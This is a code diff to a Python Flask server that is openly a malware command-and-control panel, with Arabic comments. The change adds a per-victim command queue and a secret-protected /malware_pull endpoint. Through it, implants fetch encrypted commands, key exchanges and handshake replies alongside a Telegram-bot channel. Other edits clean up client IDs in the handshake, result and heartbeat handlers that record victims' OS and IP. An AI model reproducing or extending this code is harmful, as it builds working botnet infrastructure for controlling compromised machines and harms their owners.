@@ -19,7 +19,7 @@ import platform
 import threading
 from datetime import datetime
 from functools import wraps
-from collections import defaultdict
+from collections import defaultdict, deque
 from Crypto.Cipher import AES as _AES_MOD
 from Crypto.PublicKey import RSA as _RSA_MOD
 from Crypto.Cipher import PKCS1_OAEP as _PKCS1_MOD
@@ -309,10 +309,28 @@ _tg_last_update_id = 0
 # بدون تحديث last_seen (heartbeat / أوامر) يُعتبر الكلاينت منقطعاً ويُزال من الداش
 CLIENT_OFFLINE_AFTER_SEC = int(os.environ.get("CLIENT_OFFLINE_AFTER_SEC", "120"))
 
+# رسائل موجهة لكل عميل (PUBLIC_KEY / HANDSHAKE_OK / CMD) — يَسحبها malware.py عبر HTTP
+# حتى لا يتنافس عدة عملاء على نفس getUpdates لبوت واحد.
+MALWARE_PULL_SECRET = os.environ.get("MALWARE_PULL_SECRET", "c2_malware_pull_default_change_me")
+malware_downlink: dict = defaultdict(lambda: deque(maxlen=64))
+
+
+def _malware_downlink_push(client_id: str, line: str) -> None:
+    cid = (client_id or "").strip()
+    if not cid or not line:
+        return
+    malware_downlink[cid].append(line)
+
 # ── دوال مساعدة للتيليجرام ──────────────────────────────────────────────────
 
 def _tg_send_to_channel(message: str):
     """المالوير يقرأ الأوامر والردود من الجروب فقط — نرسل إلى GROUP_ID."""
+    if message.startswith("CMD:"):
+        try:
+            cid = message.split(":", 2)[1].strip()
+            _malware_downlink_push(cid, message)
+        except Exception:
+            pass
     url = f"https://api.telegram.org/bot{C2_BOT_TOKEN}/sendMessage"
     try:
         requests.post(url, json={"chat_id": C2_GROUP_ID, "text": message}, timeout=8)
@@ -523,6 +541,7 @@ def process_tg_message():
             with open(_PUBLIC_KEY_PATH, 'rb') as f:
                 rsa_pub_b64 = base64.b64encode(f.read()).decode()
             reply = f"PUBLIC_KEY:{client_id}:{rsa_pub_b64}"
+            _malware_downlink_push(client_id, reply)
         except Exception as e:
             logger.error(f"TG Key error: {e}")
 
@@ -531,7 +550,7 @@ def process_tg_message():
         try:
             parts = text.split(":", 2)
             if len(parts) >= 3:
-                client_id          = parts[1]
+                client_id = parts[1].strip()
                 key_part, data_part = parts[2].split("|", 1)
                 decrypted_info, aes_key_bytes = _tg_decrypt_first_message(key_part, data_part)
                 info = json.loads(decrypted_info)
@@ -555,6 +574,7 @@ def process_tg_message():
                 save_log_to_db(time.time(), "handshake", decrypted_info, client_id)
                 logger.info(f"✅ TG Handshake OK: {client_id} — OS: {info.get('os')} IP: {info.get('ip')}")
                 reply = f"HANDSHAKE_OK:{client_id}"
+                _malware_downlink_push(client_id, reply)
         except Exception as e:
             logger.error(f"TG Handshake error: {e}")
 
@@ -563,7 +583,7 @@ def process_tg_message():
         try:
             parts = text.split(":", 2)
             if len(parts) >= 3:
-                client_id = parts[1]
+                client_id = parts[1].strip()
                 if client_id in tg_sessions:
                     decrypted  = _tg_decrypt(tg_sessions[client_id], parts[2])
                     result_obj = json.loads(decrypted)
@@ -605,8 +625,8 @@ def process_tg_message():
     elif text.startswith("HEARTBEAT:"):
         try:
             parts = text.split(":", 2)
-            if len(parts) >= 3 and parts[1] in tg_sessions:
-                client_id = parts[1]
+            if len(parts) >= 3 and parts[1].strip() in tg_sessions:
+                client_id = parts[1].strip()
                 _tg_decrypt(tg_sessions[client_id], parts[2])
                 if client_id in clients:
                     clients[client_id]["last_seen"] = time.time()
@@ -615,6 +635,28 @@ def process_tg_message():
             pass
 
     return jsonify({"reply": reply})
+
+
+@app.route("/malware_pull", methods=["GET"])
+@rate_limit
+def malware_pull():
+    """
+    كل عميل يسحب رسائله الخاصة فقط (نفس نص الجروب في التيليجرام).
+    Header: X-Malware-Pull-Secret — يجب أن يطابق MALWARE_PULL_SECRET على السيرفر.
+    Query: client_id
+    """
+    if request.headers.get("X-Malware-Pull-Secret", "") != MALWARE_PULL_SECRET:
+        return jsonify({"error": "Unauthorized"}), 401
+    client_id = request.args.get("client_id", "").strip()
+    if not client_id:
+        return jsonify({"error": "client_id required"}), 400
+    q = malware_downlink.get(client_id)
+    msgs = []
+    if q:
+        while q:
+            msgs.append(q.popleft())
+    return jsonify({"messages": msgs})
+
 
 # ======================== 0. المفتاح العام RSA ========================
 @app.route("/public_key", methods=["GET"])
